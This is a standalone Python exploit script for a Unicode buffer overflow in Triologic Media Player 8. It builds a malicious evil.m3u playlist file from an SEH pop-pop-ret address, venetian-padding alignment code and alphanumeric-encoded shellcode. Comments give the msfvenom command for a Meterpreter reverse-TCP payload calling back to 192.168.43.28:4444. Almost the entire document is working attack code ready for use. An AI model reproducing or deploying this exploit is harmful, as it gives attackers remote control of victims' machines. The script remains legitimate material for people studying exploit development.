
#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the unicode buffer overflow vulnerability in Triologic Media Player 8. Though it's an old vulnerability and many exploits exist for it. I created this from scratch.


# Unicode compatible pop pop rtn:
#  0x004b00cb : pop edi # pop esi # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [triomp8.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v8.0.0.0 (C:\Program Files\Triologic\Triologic Media Player\triomp8.exe)
# payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.28 LPORT=4444 R > fzunicode.raw
# Alphanumeric encoding: ./alpha2 eax --unicode --uppercase < fzunicode.raw
# Does not work with alpha_uppercase encoder of metasploit. Had to use alpha2 encoder available at https://github.com/haxtivitiez/Alpha2-encoder | command to compile gcc aplha2.c -o aplha2

filename = "evil.m3u"

align = (
"\x53"                      #push EBX   
"\x71"                      #Venetian Padding
"\x58"                      #pop EAX
"\x71"                      #Venetian Padding
"\x05\x20\x11"              #add eax,0x11002000  \
"\x71"                      #Venetian Padding     |> +900
"\x2d\x17\x11"              #sub eax,0x11001700  /
"\x71"                      #Venetian Padding
"\x50"                      #push EAX
"\x71"                      #Venetian Padding
"\xC3")                     #RETN

shellcode="PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLJH3RKPKPKPQPSY9UNQ7PRDDK20P04KPRLLTKQBLT4KCBMXLO6WPJO6P1KO6LOLQQSLM2NLMPGQ8OLMKQ97IRZR22R7DKPRLP4KOZOL4KPLLQ2XZCOXM18QR14K0YO0KQXSDKOYLX9SOJOYDKNTTKKQZ6NQKOVLWQHOLMKQY7NXIPRUL6LCSMZXOKSMMT3E9T0XDKPXMTKQ8SRFTKLLPKTK1HMLM1XSTKKTTKM1XPTIQ4MTMTQK1KQQPY1JR1KOYP1OQO0ZDKLRJKDMQM2HOCP2M0KPBH2W43OBQOR4QXPLRWO6M7SYK8KOJ0VXF0M1M0KPNI8D1D0P1XO93P2KKPKOHUQZKZ38Y0UXNKML38LBKPN11L3YYVPPR00PPPQ0PPOPR0BHZJLOIOK0KOHU4W1ZN0R6PW2HTYUU441QKOJ5SU90RTLJKOPNKXSEZL9XRGM0KPKPRJKP1ZM40V0W1XKRZ9WX1OKO9E53KHKPSNNV4KNVQZOP2HKPN0KPKPQF2JKPBHPXUTB3K5KOYE4SPSQZKP260S0W1XM29I7XQOKOXU3SZXKPSMNH0XRHKPOPM0M0QZKPPP2HLKNOLOP0KOZ50WQXRUBNPMQQKOJ5QN1NKOLLNDLO3U2PKOKOKOK95KKOKOKOKQXCMYGVT57QI37KL0H5G2PV2JKPPSKOXUA"

magic = "\x41\x71"+ "\xF2\x41" + align + "\x58"*217 + shellcode

buffer = "\x90" * 536 + magic  + "B"*(4464-len(magic))

textfile = open(filename,'w')
textfile.write(buffer)
textfile.close()
